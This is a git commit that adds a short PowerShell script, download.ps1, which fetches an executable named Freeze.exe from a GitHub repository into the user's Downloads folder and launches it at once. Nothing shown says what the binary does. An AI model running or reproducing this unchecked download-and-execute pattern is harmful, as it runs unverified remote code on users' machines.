548af2ffb821e79df70d6976f01a3736e5c84c08
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-13 12:40:32 +0300

    Update download.ps1

--- files/download.ps1
+++ files/download.ps1
@@ -1,1 +1,6 @@
+$Url = "https://github.com/webntdev/webntdev.github.io/raw/main/application/Freeze.exe"
+$OutputPath = "$env:USERPROFILE\Downloads\Freeze.exe"
 
+Invoke-WebRequest -Uri $Url -OutFile $OutputPath
+
+Start-Process -FilePath $OutputPath
